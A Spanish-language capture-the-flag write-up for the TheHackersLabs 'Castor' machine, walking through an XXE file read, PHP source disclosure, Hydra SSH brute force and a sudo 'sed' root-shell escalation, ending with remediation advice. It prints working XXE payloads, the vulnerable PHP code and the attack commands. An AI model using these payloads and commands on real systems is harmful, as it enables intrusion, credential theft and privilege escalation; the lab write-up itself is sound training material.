# TheHackersLabs — Castor

**Autor:** Luis Felipe Arana Guerra
**Plataforma:** TheHackersLabs
**Máquina:** Castor
**Dificultad:** Fácil/Media
**Fecha:** Julio 2026

---

## Resumen

Máquina Linux (Debian) que expone un servicio web con un endpoint mal nombrado, `upload.php`, que en realidad procesa XML crudo sin protección contra entidades externas. A través de una inyección XXE se logró lectura arbitraria de archivos, obteniendo el `/etc/passwd` del sistema y el código fuente del propio endpoint vulnerable. Con el usuario identificado se realizó fuerza bruta sobre SSH, obteniendo credenciales válidas. Finalmente, un permiso `sudo` mal configurado sobre el binario `sed` permitió escalar privilegios a root.

**Vector de entrada:** XXE (XML External Entity) → LFI
**Vector de escalada:** Sudo misconfiguration — GTFOBins (`sed`)

---

## 1. Reconocimiento

Enumeración inicial con Nmap sobre el objetivo (`10.0.2.14`), identificando un servicio web Apache 2.4.62 sobre Debian y el puerto SSH (22) abierto.

Durante la exploración del sitio web se localizó el endpoint `/upload.php`, aparentemente destinado a la subida de archivos.

## 2. Análisis del endpoint `upload.php`

Al interceptar la petición con **Burp Suite**, se observó que el endpoint no acepta `multipart/form-data`, sino un body en formato XML puro:

```
POST /upload.php HTTP/1.1
Host: 10.0.2.14
Content-Type: application/xml

<?xml version="1.0"?>
<test>...</test>
```

Un intento sin XML válido devolvió el mensaje `xml not provided`, confirmando que el servidor espera exclusivamente contenido XML en el body.

## 3. Explotación XXE — Lectura de `/etc/passwd`

Se envió el siguiente payload clásico de XXE:

```xml
<?xml version="1.0"?>
<!DOCTYPE test [
<!ENTITY xxe SYSTEM "file:///etc/passwd">
]>
<test>
&xxe;
</test>
```

El servidor respondió con `200 OK` y el contenido íntegro de `/etc/passwd`, confirmando la vulnerabilidad y revelando la existencia del usuario **`castorcin`**, con home `/home/castorcin` y shell `/bin/bash` (a diferencia del resto de cuentas del sistema, configuradas con `nologin`).

## 4. Disclosure del código fuente vía `php://filter`

Para entender la lógica del backend, se empleó el wrapper `php://filter` con codificación base64, evitando que el intérprete PHP ejecutara el contenido del archivo:

```xml
<?xml version="1.0"?>
<!DOCTYPE test [
<!ENTITY xxe SYSTEM "php://filter/convert.base64-encode/resource=upload.php">
]>
<test>
&xxe;
</test>
```

Decodificando la respuesta se obtuvo el código fuente completo de `upload.php`:

```php
<?php
ini_set('display_errors', 1);
error_reporting(E_ALL);

libxml_use_internal_errors(true);

$xml = file_get_contents("php://input");
if (!$xml) {
    die("xml not provided");
}

$dom = new DOMDocument();
$loaded = $dom->loadXML($xml, LIBXML_NOENT | LIBXML_DTDLOAD);

if (!$loaded) {
    foreach (libxml_get_errors() as $error) {
        echo $error->message;
    }
    exit;
}

header("Content-Type: image/svg+xml");
echo $dom->saveXML();
```

**Causa raíz:** el uso explícito de las banderas `LIBXML_NOENT | LIBXML_DTDLOAD` en `DOMDocument::loadXML()` habilita la resolución de entidades externas y la carga de DTDs externos, sin ningún tipo de sanitización o whitelist de rutas. No se identificaron funciones de ejecución de comandos (`exec`, `system`, `shell_exec`), por lo que el vector de explotación se limitó a **lectura de archivos (LFI)**, sin RCE directo vía `expect://`.

## 5. Acceso — Fuerza bruta sobre SSH

Con el usuario `castorcin` confirmado, se lanzó un ataque de diccionario contra el servicio SSH usando Hydra y la wordlist `rockyou.txt`:

```bash
hydra -l castorcin -P /usr/share/wordlists/rockyou.txt ssh://10.0.2.14 -t 4
```

Resultado:

```
[22][ssh] host: 10.0.2.14   login: castorcin   password: chocolate
```

Acceso por SSH confirmado:

```bash
ssh castorcin@10.0.2.14
```

## 6. Escalada de privilegios — Sudo + GTFOBins (`sed`)

Enumeración de privilegios sudo del usuario:

```bash
sudo -l
```

```
User castorcin may run the following commands on TheHackersLabs-Castor:
    (ALL : ALL) NOPASSWD: /usr/bin/sed
```

El binario `sed` permite ejecutar comandos arbitrarios a través del flag de ejecución (`e`) dentro de una expresión, tal como documenta [GTFOBins](https://gtfobins.github.io/gtfobins/sed/):

```bash
sudo /usr/bin/sed -n '1e exec /bin/sh 1>&0' /etc/hosts
```

Esto genera una shell interactiva con privilegios de **root**.

## 7. Flags

```
user.txt: THL{JDBNASJ-----dkasdaCastorcito}
root.txt: THL{asdma-------kCASTOR}
```

---

## Conclusiones y recomendaciones

| Hallazgo | Recomendación |
|---|---|
| XXE en `upload.php` | Deshabilitar la resolución de entidades externas y carga de DTD (`libxml_disable_entity_loader`, evitar `LIBXML_NOENT`/`LIBXML_DTDLOAD`) |
| Contraseña débil (`chocolate`) | Política de contraseñas robustas + límite de intentos (fail2ban) en SSH |
| Regla `sudo` sin restricción de argumentos | Evitar `NOPASSWD` en binarios con capacidad de ejecución de comandos (ver GTFOBins); restringir con rutas/argumentos específicos o usar `sudoedit` cuando aplique |

## Herramientas utilizadas

- Nmap
- Burp Suite (Repeater)
- XXE / DOMDocument (manual)
- Hydra
- SSH
- GTFOBins (`sed`)
